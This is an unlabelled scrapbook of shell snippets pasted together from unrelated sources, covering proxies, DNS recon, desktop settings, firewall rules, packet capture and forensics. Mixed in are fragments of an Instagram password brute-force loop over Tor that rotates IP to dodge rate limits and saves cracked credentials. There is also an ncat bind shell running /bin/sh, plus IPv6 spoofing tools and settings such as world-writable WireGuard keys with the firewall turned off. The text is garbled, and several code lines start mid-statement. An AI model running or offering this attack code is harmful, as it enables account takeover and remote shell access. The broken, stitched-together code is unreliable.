




git config --global https.proxy http://127.0.0.1:1080
git config --global https.proxy https://127.0.0.1:1080
git config --local https.proxy https://127.0.0.1:1080
git config --global --unset http.proxy
git config --global --unset https.proxy

git config --global http.proxy 'socks5://127.0.0.1:1080'
git config --global https.proxy 'socks5://127.0.0.1:1080'


[http]
    proxy = socks5://127.0.0.1:1080
[https]
    proxy = socks5://127.0.0.1:1080



git config --global http.proxy socks5://your-server:your-port
Unset proxy:
git config --global --unset http.proxy





ss -tln | grep 1080
LISTEN     0      128    127.0.0.1:1080                     *:* 



hmac=$(echo -n "$data" | openssl dgst -sha256 -hmac "${ig_sig}" | cut -d " " -f2)



curl --socks5-hostname localhost:9050 -s https://check.torproject.org 


curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait" | uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;


(curl --socks5-hostname 127.0.0.1:9050 -d "ig_sig_key_version=4&signed_body=$hmac.$data" -s --user-agent 'User-Agent: "Instagram 10.26.0 Android (18/4.3; 320dpi; 720x1280; Xiaomi; HM 1SW; armani; qcom; en_US)"' -w "\n%{http_code}\n" -H "$header" "https://i.instagram.com/api/v1/accounts/login/" | grep -o "logged_in_user\|challenge\|many tries\|Please wait"| uniq ); if [[ $var == "challenge" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n [*] Challenge required\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; elif [[ $var == "logged_in_user" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n" $pass; printf "Username: %s, Password: %s\n" $user $pass >> found.instashell ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m"; kill -1 $$  ; elif [[ $var == "Please wait" ]]; then changeip; fi; ) } & done; wait $!;






Resolve all AAAA records from domains within domains.txt using the resolvers within resolvers.txt in lists and store the results within results.txt:

$ ./bin/massdns -r lists/resolvers.txt -t AAAA domains.txt > results.txt

This is equivalent to:

$ ./bin/massdns -r lists/resolvers.txt -t AAAA -w results.txt domains.txt

Example output

By default, MassDNS will output response packets in text format which looks similar to the following:

;; Server: 77.41.229.2:53
;; Size: 93
;; Unix time: 1513458347
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 51298
;; flags: qr rd ra ; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 0

;; QUESTION SECTION:
example.com. IN A

;; ANSWER SECTION:
example.com. 45929 IN A 93.184.216.34

;; AUTHORITY SECTION:
example.com. 24852 IN NS b.iana-servers.net.
example.com. 24852 IN NS a.iana-servers.net.

The resolver IP address is included in order to make it easier for you to filter the output in case you detect that some resolvers produce bad results.



PTR records

MassDNS includes a Python script allowing you to resolve all IPv4 PTR records by printing their respective queries to the standard output.

$ ./scripts/ptr.py | ./bin/massdns -r lists/resolvers.txt -t PTR -w ptr.txt

Please note that the labels within in-addr.arpa are reversed. In order to resolve the domain name of 1.2.3.4, MassDNS expects 4.3.2.1.in-addr.arpa as input query name. As a consequence, the Python script does not resolve the records in an ascending order which is an advantage because sudden heavy spikes at the name servers of IPv4 subnets are avoided.




Reconnaissance by brute-forcing subdomains

Perform reconnaissance scans responsibly and adjust the -s parameter to not overwhelm authoritative name servers.

Similar to subbrute, MassDNS allows you to brute force subdomains using the included subbrute.py script:

$ ./scripts/subbrute.py lists/names.txt example.com | ./bin/massdns -r lists/resolvers.txt -t A -o S -w results.txt

As an additional method of reconnaissance, the ct.py script extracts subdomains from certificate transparency logs by scraping the data from crt.sh:

$ ./scripts/ct.py example.com | ./bin/massdns -r lists/resolvers.txt -t A -o S -w results.txt

The files names.txt and names_small.txt, which have been copied from the subbrute project, contain names of commonly used subdomains. Also consider using Jason Haddix' subdomain compilation with over 1,000,000 names.



















for i in *.csv; do
	mkdir -p "${i%.csv}"
	sed -nEe 's,.*(https://.*),\1,gp' "$i" | while read url; do
		out="$( cd json && "$sdir/gmaps_get_cid.sh" "$url" )"
		if [ -n "$out" ]; then ln -sf "../json/$out" "${i%.csv}/$out"; fi
	done
done



chmod 771 "$package"
chown -hR "$(stat -c %u:%g ../$package                    )" "$package"
chcon -hR "$(ls -Zd        ../$package     | cut '-d ' -f1)" "$package"

	chown -h  "$(stat -c %u:%g ../$package/lib                )" "$package"/lib
	chcon -h  "$(ls -Zd        ../$package/lib | cut '-d ' -f1)" "$package"/lib



download the correct root cert for the SUPL_TLS_HOST:

openssl s_client -connect $SUPL_TLS_HOST:$SUPL_SECURE_PORT -prexit -showcerts

It will output a bunch of stuff. Only proceed if near the bottom you see "Verify return code: 0 (ok)". Then, find the root certificate (probably the last one that was output), paste it into a new file SuplRootCert.pem, then run:

openssl x509 -in SuplRootCert.pem -outform DER -out SuplRootCert

You can then copy SuplRootCert into your phone. Put it next to gps.conf and then set the entry for SUPL_TLS_CERT to point to it.



ansible-[harden-sysctl]-Debian-9.yml



danetool --tlsa-rr --load-certificate $Dir/cert-ecc256.pem" --host $Domain --outfile $Dane.rr






gpg --keyserver keys.gnupg.net --recv 886DDD89
gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key add -

echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" > /etc/apt/sources.list && \
echo "deb-src http://http.kali.org/kali kali-rolling main contrib non-free" >> /etc/apt/sources.list




https://www.virtualbox.org/download/oracle_vbox.asc



apt-get install qemu-system-arm qemu-system-mips qemu-system-common qemu-system-x86 qemu virt-manager virtinst -y



sed -i -e 's/\#X11Forwarding no/X11Forwarding yes/' /etc/ssh/sshd_config
sed -i -e 's/\#X11DisplayOffset/X11DisplayOffset/' /etc/ssh/sshd_config
sed -i -e 's/\#X11UseLocalhost/X11UseLocalhost/' /etc/ssh/sshd_config
sed -i -e 's/\#AllowTcpForwarding/AllowTcpForwarding/' /etc/ssh/sshd_config

sed -i "s/.PasswordAuthentication yes/PasswordAuthentication no/" /etc/ssh/sshd_config
sed -i "s/.UseDNS yes/UseDNS no/" /etc/ssh/sshd_config



sed -i -e "s,^GRUB_TIMEOUT=.*,GRUB_TIMEOUT=0," /etc/default/grub
update-grub



gconftool-2 --type bool --set /apps/gnome-terminal/profiles/Default/scrollback_unlimited true #Terminal -> Edit -> Profile Preferences -> Scrolling -> Scrollback: Unlimited -> Close
gconftool-2 --type string --set /apps/gnome-terminal/profiles/Default/background_darkness 0.85611499999999996 # Not working 100%!
gconftool-2 --type string --set /apps/gnome-terminal/profiles/Default/background_type transparent

            gsettings set org.gnome.gnome-panel.layout toplevel-id-list "['top-panel']"
            dconf write /org/gnome/gnome-panel/layout/objects/workspace-switcher/toplevel-id "'top-panel'"
            dconf write /org/gnome/gnome-panel/layout/objects/window-list/toplevel-id "'top-panel'"
            dconf write /org/gnome/gnome-panel/layout/toplevels/top-panel/orientation "'top'" #"'right'" # Issue with window-list
            dconf write /org/gnome/gnome-panel/layout/objects/menu-bar/pack-type "'start'"
            dconf write /org/gnome/gnome-panel/layout/objects/menu-bar/pack-index 0
            dconf write /org/gnome/gnome-panel/layout/objects/window-list/pack-type "'start'" # "'center'"
            dconf write /org/gnome/gnome-panel/layout/objects/window-list/pack-index 5 #0
            dconf write /org/gnome/gnome-panel/layout/objects/workspace-switcher/pack-type "'end'"
            dconf write /org/gnome/gnome-panel/layout/objects/clock/pack-type "'end'"
            dconf write /org/gnome/gnome-panel/layout/objects/user-menu/pack-type "'end'"
            dconf write /org/gnome/gnome-panel/layout/objects/notification-area/pack-type "'end'"
            dconf write /org/gnome/gnome-panel/layout/objects/workspace-switcher/pack-index 1
            dconf write /org/gnome/gnome-panel/layout/objects/clock/pack-index 2
            dconf write /org/gnome/gnome-panel/layout/objects/user-menu/pack-index 3
            dconf write /org/gnome/gnome-panel/layout/objects/notification-area/pack-index 4


dconf write /org/
dconf write /org/gnome/nautilus/preferences/show-hidden-files true
dconf load /org/gnome/

 << EOT

EOT


gsettings set org.gnome.
xfconf-query -c xsettings -p /Net/IconThemeName -s "gnome-brave"
xfconf-query -c xfwm4 -p /general/use_compositing -s true

if [ ! -e /root/.config/Thunar/thunarrc ]; then
    echo -e "[Configuration]\nLastShowHidden=TRUE" > /root/.config/Thunar/thunarrc;
else
    sed -i 's/LastShowHidden=.*/LastShowHidden=TRUE/' /root/.config/Thunar/thunarrc;
fi







if [ ! -e ~/.gtk-bookmarks.bkup ]; then
    cp -f ~/.gtk-bookmarks{,.bkup};
fi
echo -e 'file:///var/www www\nfile:///usr/share apps\nfile:///tmp tmp\nfile:///usr/local/src/ src' >> ~/.gtk-bookmarks



echo -e "[Desktop Entry]\nVersion=1.0\nType=Application\nExec=exo-open --launch TerminalEmulator\nIcon=utilities-terminal\nStartupNotify=false\nTerminal=false\nCategories=Utility;X-XFCE;X-Xfce-Toplevel;\nOnlyShowIn=XFCE;\nName=Terminal Emulator\nName[en_GB]=Terminal Emulator\nComment=Use the command line\nComment[en_GB]=Use the command line\nX-XFCE-Source=file:///usr/share/applications/exo-terminal-emulator.desktop" > /root/.config/xfce4/panel/launcher-16/13684522758.desktop
    
    
echo -e '<?xml version="1.0" encoding="UTF-8"?>\n\n<channel name="xfce4-keyboard-shortcuts" version="1.0">\n <property name="commands" type="empty">\n <property name="default" type="empty">\n <property name="&lt;Alt&gt;F2" type="empty"/>\n <property name="&lt;Primary&gt;&lt;Alt&gt;Delete" type="empty"/>\n <property name="XF86Display" type="empty"/>\n <property name="&lt;Super&gt;p" type="empty"/>\n <property name="&lt;Primary&gt;Escape" type="empty"/>\n </property>\n <property name="custom" type="empty">\n <property name="XF86Display" type="string" value="xfce4-display-settings --minimal"/>\n <property name="&lt;Super&gt;p" type="string" value="xfce4-display-settings --minimal"/>\n <property name="&lt;Primary&gt;&lt;Alt&gt;Delete" type="string" value="xflock4"/>\n <property name="&lt;Primary&gt;Escape" type="string" value="xfdesktop --menu"/>\n <property name="&lt;Alt&gt;F2" type="string" value="xfrun4"/>\n <property name="override" type="bool" value="true"/>\n </property>\n </property>\n <property name="xfwm4" type="empty">\n <property name="default" type="empty">\n <property name="&lt;Alt&gt;Insert" type="empty"/>\n <property name="Escape" type="empty"/>\n <property name="Left" type="empty"/>\n <property name="Right" type="empty"/>\n <property name="Up" type="empty"/>\n <property name="Down" type="empty"/>\n <property name="&lt;Alt&gt;Tab" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Shift&gt;Tab" type="empty"/>\n <property name="&lt;Alt&gt;Delete" type="empty"/>\n <property name="&lt;Control&gt;&lt;Alt&gt;Down" type="empty"/>\n <property name="&lt;Control&gt;&lt;Alt&gt;Left" type="empty"/>\n <property name="&lt;Shift&gt;&lt;Alt&gt;Page_Down" type="empty"/>\n <property name="&lt;Alt&gt;F4" type="empty"/>\n <property name="&lt;Alt&gt;F6" type="empty"/>\n <property name="&lt;Alt&gt;F7" type="empty"/>\n <property name="&lt;Alt&gt;F8" type="empty"/>\n <property name="&lt;Alt&gt;F9" type="empty"/>\n <property name="&lt;Alt&gt;F10" type="empty"/>\n <property name="&lt;Alt&gt;F11" type="empty"/>\n <property name="&lt;Alt&gt;F12" type="empty"/>\n <property name="&lt;Control&gt;&lt;Shift&gt;&lt;Alt&gt;Left" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;End" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;Home" type="empty"/>\n <property name="&lt;Control&gt;&lt;Shift&gt;&lt;Alt&gt;Right" type="empty"/>\n <property name="&lt;Control&gt;&lt;Shift&gt;&lt;Alt&gt;Up" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_1" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_2" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_3" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_4" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_5" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_6" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_7" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_8" type="empty"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_9" type="empty"/>\n <property name="&lt;Alt&gt;space" type="empty"/>\n <property name="&lt;Shift&gt;&lt;Alt&gt;Page_Up" type="empty"/>\n <property name="&lt;Control&gt;&lt;Alt&gt;Right" type="empty"/>\n <property name="&lt;Control&gt;&lt;Alt&gt;d" type="empty"/>\n <property name="&lt;Control&gt;&lt;Alt&gt;Up" type="empty"/>\n <property name="&lt;Super&gt;Tab" type="empty"/>\n <property name="&lt;Control&gt;F1" type="empty"/>\n <property name="&lt;Control&gt;F2" type="empty"/>\n <property name="&lt;Control&gt;F3" type="empty"/>\n <property name="&lt;Control&gt;F4" type="empty"/>\n <property name="&lt;Control&gt;F5" type="empty"/>\n <property name="&lt;Control&gt;F6" type="empty"/>\n <property name="&lt;Control&gt;F7" type="empty"/>\n <property name="&lt;Control&gt;F8" type="empty"/>\n <property name="&lt;Control&gt;F9" type="empty"/>\n <property name="&lt;Control&gt;F10" type="empty"/>\n <property name="&lt;Control&gt;F11" type="empty"/>\n <property name="&lt;Control&gt;F12" type="empty"/>\n </property>\n <property name="custom" type="empty">\n <property name="&lt;Control&gt;F3" type="string" value="workspace_3_key"/>\n <property name="&lt;Control&gt;F4" type="string" value="workspace_4_key"/>\n <property name="&lt;Control&gt;F5" type="string" value="workspace_5_key"/>\n <property name="&lt;Control&gt;F6" type="string" value="workspace_6_key"/>\n <property name="&lt;Control&gt;F7" type="string" value="workspace_7_key"/>\n <property name="&lt;Control&gt;F8" type="string" value="workspace_8_key"/>\n <property name="&lt;Control&gt;F9" type="string" value="workspace_9_key"/>\n <property name="&lt;Alt&gt;Tab" type="string" value="cycle_windows_key"/>\n <property name="&lt;Control&gt;&lt;Alt&gt;Right" type="string" value="right_workspace_key"/>\n <property name="Left" type="string" value="left_key"/>\n <property name="&lt;Control&gt;&lt;Alt&gt;d" type="string" value="show_desktop_key"/>\n <property name="&lt;Control&gt;&lt;Shift&gt;&lt;Alt&gt;Left" type="string" value="move_window_left_key"/>\n <property name="&lt;Control&gt;&lt;Shift&gt;&lt;Alt&gt;Right" type="string" value="move_window_right_key"/>\n <property name="Up" type="string" value="up_key"/>\n <property name="&lt;Alt&gt;F4" type="string" value="close_window_key"/>\n <property name="&lt;Alt&gt;F6" type="string" value="stick_window_key"/>\n <property name="&lt;Control&gt;&lt;Alt&gt;Down" type="string" value="down_workspace_key"/>\n <property name="&lt;Alt&gt;F7" type="string" value="move_window_key"/>\n <property name="&lt;Alt&gt;F9" type="string" value="hide_window_key"/>\n <property name="&lt;Alt&gt;F11" type="string" value="fullscreen_key"/>\n <property name="&lt;Alt&gt;F8" type="string" value="resize_window_key"/>\n <property name="&lt;Super&gt;Tab" type="string" value="switch_window_key"/>\n <property name="Escape" type="string" value="cancel_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_1" type="string" value="move_window_workspace_1_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_2" type="string" value="move_window_workspace_2_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_3" type="string" value="move_window_workspace_3_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_4" type="string" value="move_window_workspace_4_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_5" type="string" value="move_window_workspace_5_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_6" type="string" value="move_window_workspace_6_key"/>\n <property name="Down" type="string" value="down_key"/>\n <property name="&lt;Control&gt;&lt;Shift&gt;&lt;Alt&gt;Up" type="string" value="move_window_up_key"/>\n <property name="&lt;Shift&gt;&lt;Alt&gt;Page_Down" type="string" value="lower_window_key"/>\n <property name="&lt;Alt&gt;F12" type="string" value="above_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_8" type="string" value="move_window_workspace_8_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_9" type="string" value="move_window_workspace_9_key"/>\n <property name="Right" type="string" value="right_key"/>\n <property name="&lt;Alt&gt;F10" type="string" value="maximize_window_key"/>\n <property name="&lt;Control&gt;&lt;Alt&gt;Up" type="string" value="up_workspace_key"/>\n <property name="&lt;Control&gt;F10" type="string" value="workspace_10_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;KP_7" type="string" value="move_window_workspace_7_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;End" type="string" value="move_window_next_workspace_key"/>\n <property name="&lt;Alt&gt;Delete" type="string" value="del_workspace_key"/>\n <property name="&lt;Control&gt;&lt;Alt&gt;Left" type="string" value="left_workspace_key"/>\n <property name="&lt;Control&gt;F12" type="string" value="workspace_12_key"/>\n <property name="&lt;Alt&gt;space" type="string" value="popup_menu_key"/>\n <property name="&lt;Alt&gt;&lt;Shift&gt;Tab" type="string" value="cycle_reverse_windows_key"/>\n <property name="&lt;Shift&gt;&lt;Alt&gt;Page_Up" type="string" value="raise_window_key"/>\n <property name="&lt;Alt&gt;Insert" type="string" value="add_workspace_key"/>\n <property name="&lt;Alt&gt;&lt;Control&gt;Home" type="string" value="move_window_prev_workspace_key"/>\n <property name="&lt;Control&gt;F2" type="string" value="workspace_2_key"/>\n <property name="&lt;Control&gt;F1" type="string" value="workspace_1_key"/>\n <property name="&lt;Control&gt;F11" type="string" value="workspace_11_key"/>\n <property name="override" type="bool" value="true"/>\n </property>\n </property>\n <property name="providers" type="array">\n <value type="string" value="xfwm4"/>\n <value type="string" value="commands"/>\n </property>\n</channel>' > /root/.config/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml




/etc/network/interfaces

auto lo
iface lo inet loopback

# Management interface using DHCP (not recommended due to Bro issue described above)
auto eth0
iface eth0 inet dhcp

# OR 

# Management interface using STATIC IP (instead of DHCP)
auto eth0
iface eth0 inet static
  address 192.168.1.14
  gateway 192.168.1.1
  netmask 255.255.255.0
  network 192.168.1.0
  broadcast 192.168.1.255
  # If running Security Onion 14.04, you'll need to configure DNS here
  dns-nameservers 192.168.1.1 192.168.1.2

# AND one or more of the following

# Connected to TAP or SPAN port for traffic monitoring
auto eth1
iface eth1 inet manual
  up ifconfig $IFACE -arp up
  up ip link set $IFACE promisc on
  down ip link set $IFACE promisc off
  down ifconfig $IFACE down
  post-up for i in rx tx sg tso ufo gso gro lro; do ethtool -K $IFACE $i off; done
  # If running Security Onion 14.04, you should also disable IPv6 as follows:
  post-up echo 1 > /proc/sys/net/ipv6/conf/$IFACE/disable_ipv6








# tweaks for 'unshare' error
echo 1 > /sys/fs/cgroup/cpuset/cgroup.clone_children
echo "kernel.unprivileged_userns_clone = 1" >> /etc/sysctl.conf



set sysctl to run unprivileged containers

sysctl kernel.unprivileged_userns_clone=1


# tweaks for cgroup errors
systemctl enable cgmanager.service

chown -R $LXC_USER:$LXC_USER /home/$LXC_USER


Running a disk image in a container

systemd-nspawn -i foobar.raw -b


socat openssl-listen:18443,fork,reuseaddr,cert=1.crt,key=1.key,verify=0 system:'tee /dev/stderr | socat - openssl\:127.0.0.1\:8443\,verify=0 | tee /dev/stderr'

    socat tcp-l:16667,fork,reuseaddr system:'stdbuf -i0 -o0 sed "s/hello/preved/g" | socat - tcp\:127.0.0.1\:6667 | stdbuf -i0 -o0 sed "s/[A-Z0-9]\\\\{31\\\\}=/CENSORED/g"'


# Setup logwatch
    sudo aptitude install logwatch -y;
    sudo touch /etc/cron.daily/00logwatch;
    sudo echo "/usr/sbin/logwatch --output mail --mailto anand.jeyahar@gmail.com --detail high" >> /etc/cron.daily/00logwatch;



iptables -A INPUT -m string --algo kmp --string "TESTTEST" -j DROP
  iptables -A INPUT -m string --algo kmp --hex-string "|4b004b00|" -j DROP

	# let openvpn's user (typically either root or a dedicated user) talk to it:
	/sbin/iptables $ACTION OUTPUT -d $trusted_ip -m owner --uid-owner $EUID -j ACCEPT
	# forbid everyone else from doing so:
	/sbin/iptables $ACTION OUTPUT -d $trusted_ip -j REJECT









# if argument was given, identify the DNS servers for the domain
for server in $(host -t ns $1 |cut -d" " -f4);do

alias services_running='systemctl list-units --type=service --state=running'

alias dockly='docker run -it --rm -v /var/run/docker.sock:/var/run/docker.sock lirantal/dockly'
alias sniper='docker run -it sn1per-docker sniper $@'
alias msf='sh -c "service postgresql start && msfdb init && msfconsole;${SHELL:-bash}"'



# Set incoming exceeded drop rule to prevent connection resets
$IPTABLES -I INPUT -p icmpv6 --icmpv6-type 3 -i $INT -j DROP

ip6tables -A OUTPUT -p icmpv6 --icmpv6-type 1 -j DROP

| xargs -I IP iptables -A INPUT -s IP -j DROP



$IPTABLES -A OUTPUT -m owner --uid-owner $APPLICATION_UID  -j REJECT








ping6 -c 3 google.com
passive_discovery6 -s -R 3000:: $INT

fake_mld6 $INT query
alive6 -l $INT
dump_router6 $INT
fake_router26 -A 3000::/64 -a 2 -l 2 -n 1 -p low $INT
ifconfig $INT | grep -iq global && alive6 $INT
node_query6 $INT ff02::1
fake_mld26 $INT query

# Start connsplit6
connsplit6 -v $INT $M


thcping6 eth0 2003::1 ipv6.google.com
alive6 -I 2003::1 eth0 ipv6.google.com
trace6 -s 2003::1 eth0 ipv6.google.com



ncat -6 -p 64446 -s $FROM TARGET SHELLPORT
ncat -6 -p SHELLPORT -l -e /bin/sh


ip -6 addr add $FROM/64 dev $INT
ip -6 addr add $TO/64 dev $INT
ip -6 addr add 2003::1/64 dev eth0


nmcli con mod ens192 ipv4.address 10.0.5.234/24
nmcli networking off
nmcli networking on




echo "## -------------------------------------------------------------- ##"
echo "## m===============-[?]>  Ensure keys exist  <[?]===============m ##"
echo "## -------------------------------------------------------------- ##"

echo "##-====================================================-##"
echo "##   [+] Create .ssh/ if it doesnt currently exist:"
echo "##-====================================================-##"


    [ -d ~/.ssh/ ] || mkdir ~/.ssh

echo "## --------------------------------------------------------- ##"
echo "##   [?] Generate passwordless keys if they don't exist
echo "## --------------------------------------------------------- ##"
    [ -f ~/.ssh/id_rsa ] || ssh-keygen -N "" -f ~/.ssh/id_rsa

echo "## ------------------------------------------------------------- ##"
echo "##   [?] Create an authorized_keys file if it doesn't exist
echo "## ------------------------------------------------------------- ##"
    [ -f ~/.ssh/authorized_keys ] || touch ~/.ssh/authorized_keys

echo "## ------------------------------------------------- ##"
echo "##   [?] Add our key to it if it is not present"
echo "## ------------------------------------------------- ##"
    KEY=$(cat ~/.ssh/id_rsa.pub)
    grep -Fxq "$KEY" ~/.ssh/authorized_keys || cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
echo "## m============================= End ==================================m ##"




sshuttle -r USER@CLOUD_SERVER_DOMAIN 


--x509keyfile ${KEY1} --x509certfile ${CERT1}


${VALGRIND} "${CLI}" -p "${PORT}" 127.0.0.1 --insecure --udp </dev/null >/dev/null || \ 	fail ${PID} "1. handshake should have succeeded!" #retry ${VALGRIND} "${CLI}" -p "${PORT}" 127.0.0.1 --insecure --udp </dev/null >/dev/null || \ 	fail ${PID} "2. handshake should have succeeded!"






passivedns -r ${src_file} -l ${DEST_DIR_ROOT}/${directory}/passivedns.txt -L ${DEST_DIR_ROOT}/${directory}/passivedns_nxdomain.txt


#zeek for572-allfiles -r ${src_file}

nfpcapd -r ${src_file} -S 1 -z -l ${DEST_DIR_ROOT}/${directory}/netflow/${filename}

tcpdump -n -s 0 -r ${src_file} -w ${DEST_DIR_ROOT}/${directory}/tcpdump_reduced/${TRAFFIC_TYPE}_${filename} ${BPF}


nfdump $READFLAG $SOURCE_LOCATION -6 -q -N -o "fmt:$EXPORTER_IP $NFDUMP2SOFELK_FMT" > $DESTINATION_FILE

 $0 -e 1.2.3.4 -r /path/to/netflow/ -w /logstash/nfarch/<filename>.txt
-r /path/to/netflow/nfcapd.201703190000 -w /logstash/nfarch/<filename>.txt
-r /path/to/netflow/ -w /logstash/nfarch/<filename>.txt




    Generate the Plaso dumpfile
log2timeline.py -z UTC --parsers "win7,-filestat" /cases/capstone/base-rd01-triage-plaso.dump /mnt/windows_mount/base-rd01/


    Use psort.py to generate CSV
psort.py -z "UTC" -o L2tcsv base-rd01-triage-plaso.dump "date > '2018-08-23 00:00:00' AND date < '2018-09-07 00:00:00'" -w base-rd01-triage-plaso.csv







PPPoE
=====
tcpdump -i eth0 -n -vvv -e ether proto 0x8864



VLAN-Q injection
tcpdump -i eth0 -n -vvv -e ether proto 0x8100



tcpdump -i eth0 -n -e ip proto 41



dumpcap -i any -P -f 'port not 22' -w-


tcpdump -s 0 -i any -f 'port not 22' -w -" | wireshark -k -i -


tcpdump -s 0 -i any -f 'port not 22' -C 100 -w dump.pcap

tcpflow -r dump.pcap -o tcps/





echo -e "Halting captures...\n\n"

if [[ ! -z $(pidof tcpdump) ]]; then kill $(pidof tcpdump); fi

echo -e "Merging captures ...\n\n"


mergecap $CAPNAME-$NET0.pcap $CAPNAME-$NET1.pcap -w $CAPNAME-Full.pcap






snmpwalk -Os -c SYS265 -v2c fw01-amber system
snmpwalk -Os -c SYS265 -v2c web01-amber system








dpkg --get-selections | grep install | awk '{print $1}'




spiderfoot -s domain.com

##  DMARC email spoofing
spoofcheck.py domain.com


# theHarvester
theHarvester -d domain.com -b all


# https://github.com/thewhiteh4t/FinalRecon
finalrecon.py --full https://example.com

# https://github.com/evyatarmeged/Raccoon
raccoon domain.com


# https://github.com/s0md3v/Photon
sudo python3 photon.py -u domain.com -l 3 -t 10 -v --wayback --keys --dns

# https://github.com/j3ssie/Osmedeus
sudo python3 osmedeus.py -t example.com






Discover the syscalls a binary uses
(Uses STrace to analysis the syscalls)

strace -cfo "$STRACE_OUTPUT_FILE" "$@" && awk '{print $NF}' "$STRACE_OUTPUT_FILE" | sed '/syscall\|-\|total/d' | sort -u | awk -vORS=, '{ print $1 }' | sed 's/,$/\n/' > "$SYSCALLS_OUTPUT_FILE"





 	Click here for more information 	truss -f -p <pid of a shell>
/* Using multiple windows, this can be used to trace setuid/setgid programs */

Click here for more information 	/usr/bin/iostat -E
/* Command to display drives statistics */








##  https://raw.githubusercontent.com/ioerror/duraconf/master/configs/gnupg/gpg.conf



##  Policies generated by the Full System Learning mode
##  are lumped under role default, subject /
gradm -F -L /etc/grsec/learning.logs -O /etc/grsec/policy



qrencode

  wg genkey | tee sprivatekey | wg pubkey > spublickey
    wg genkey | tee cprivatekey | wg pubkey > cpublickey


eth=$(ls /sys/class/net | grep e | head -1)
    chmod 777 -R /etc/wireguard
    systemctl stop firewalld
    systemctl disable firewalld
    yum install -y iptables-services 
    systemctl enable iptables 
    systemctl start iptables 


root hints
    root zone servers, usually called named.ca but names like db.cache, named.root or root.ca are also common. 
zone file
    map hostnames to IP addresses, most of the DNS info is stored here. Usually given a descriptive name such as linuxquestions.org.hosts
reverse zone file
    map IP addresses to hostnames. Usually given a descriptive name such as 192.168.1.rev



iwlist scan




#writes to /etc/network/interfaces file for WPA encryption: essid, key, protocols, etc.
	if [ "$IE" == "WPA" ]; then
		sudo cp /etc/network/interfaces /etc/network/interfaces.bakup
		sudo sed -i 's/iface wlan0 inet manual/iface wlan0 inet dhcp/' /etc/network/interfaces
		sudo sed -i -e "/dhcp/a\wpa-passphrase $key" \
	-e "/dhcp/a\wpa-driver wext" \
	-e "/dhcp/a\wpa-key-mgmt WPA-PSK" \
	-e "/dhcp/a\wpa-proto WPA" \
	-e "/dhcp/a\wpa-ssid \"$wifi\"" /etc/network/interfaces
	sudo /etc/init.d/networking restart
	sudo cp /etc/network/interfaces.bakup /etc/network/interfaces
	sudo rm /etc/network/interfaces.bakup
	exit





#sets the wireless configuration for non WPA: essid, channel, mode, key, etc
		sudo iwconfig wlan0 essid \""$wifi"\" channel $channel mode $mode key $key
		echo "------------------------------------------------"
		echo "Connecting to: $wifi at channel: $channel, mode: $mode"
		echo "------------------------------------------------"

#connects to wifi connection
    sudo dhclient
exit


ip=$(lynx -dump http://cfaj.freeshell.org/ipaddr.cgi)

/sbin/ifconfig $1 | grep inet | awk '{print $2}' | sed 's/^addr://g'



sed -i "s/.PasswordAuthentication yes/PasswordAuthentication no/" /etc/ssh/sshd_config
sed -i "s/.UseDNS yes/UseDNS no/" /etc/ssh/sshd_config



move a file to a remote host:

scp filename user@remote1:/path/to/destination/dir




copy the file 
scp foo tux@remote1:/home/tux/files/



copy a file from the remote host to the current directory:
scp user@remote1:/path/to/file filename


upload a file "foobar.txt" on a local computer
to a remote host "hostname.org" using 
the username "user" to the /var/www directory

scp foobar.txt user@hostname.org:/var/www/



ssh/scp is on port 2000 then:

scp -P 2000 filename.txt remote_user_name@remote_server.org:


use SSH key based authentication then when you scp, 
scp will not ask for user's password. 
It will copy your file to the remote server using your ssh private key.

